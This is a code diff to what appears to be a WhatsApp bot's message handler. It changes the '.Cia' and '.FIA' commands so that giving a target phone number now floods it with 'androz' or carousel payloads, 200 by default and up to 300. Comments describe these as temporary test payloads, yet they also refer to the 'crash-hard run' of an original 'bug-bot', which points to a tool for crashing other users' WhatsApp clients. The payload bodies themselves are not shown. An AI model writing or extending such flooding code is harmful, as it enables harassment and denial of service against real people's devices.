@@ -6886,8 +6886,8 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     // 🧪 TEMPORARY .Cia / .FIA — sandbox payloads (owner/dev only; delete with
     // the other test commands when antibug testing ends).
     //   ".Cia"                  → usage help only (never fires bare)
-    //   ".Cia <number>"         → ONE androz payload at that number
-    //   ".Cia <number> <N>"     → androz burst/flood (N optional, 1-300)
+    //   ".Cia <number>"         → androz FLOOD at that number (default ×200)
+    //   ".Cia <number> <N>"     → androz flood with custom count (1-300)
     //   ".FIA" / ".FIA <number>" / ".FIA <number> <N>" → same for carousel
     //   Flood versions of the one-shot .cis/.fis probes live on .cisd/.fisd
     //   (see their own block). Case-insensitive. The bot's OWN number is
@@ -6905,10 +6905,11 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
         const input = args.join(' ').trim();
 
-        // Optional trailing count, e.g. ".cia 234xxx 200". Only a trailing
-        // 1–3 digit token counts (real numbers are longer). Default = 1 shot.
+        // Optional trailing count, e.g. ".cia 234xxx 150". Only a trailing
+        // 1–3 digit token counts (real numbers are longer). Default = 200
+        // (the typical crash-hard run in the original bug-bot).
         let targetInput = input;
-        let count = 1;
+        let count = 200;
         let flood = false;
         {
             const cw = targetInput.split(/\s+/).filter(Boolean);
@@ -6925,8 +6926,8 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         if (!targetInput) {
             await safeWaReply(sock, remoteJid,
                 `🧪 *${displayKind} USAGE*\n\n` +
-                `• .${displayKind} <number> — one shot at that number\n` +
-                `• .${displayKind} <number> <amount> — flood (1-300)`, msg);
+                `• .${displayKind} <number> — flood (default ×200)\n` +
+                `• .${displayKind} <number> <amount> — custom count (1-300)`, msg);
             return;
         }
 
@@ -6938,8 +6939,8 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 await safeWaReply(sock, remoteJid,
                     `❌ *USAGE*\n\n` +
                     `• .${displayKind} — fires here (current chat)\n` +
-                    `• .${displayKind} <number> — one shot\n` +
-                    `• .${displayKind} <number> <1-300> — burst/flood count`,
+                    `• .${displayKind} <number> — flood (default ×200)\n` +
+                    `• .${displayKind} <number> <1-300> — custom count`,
                     msg);
                 return;
             }
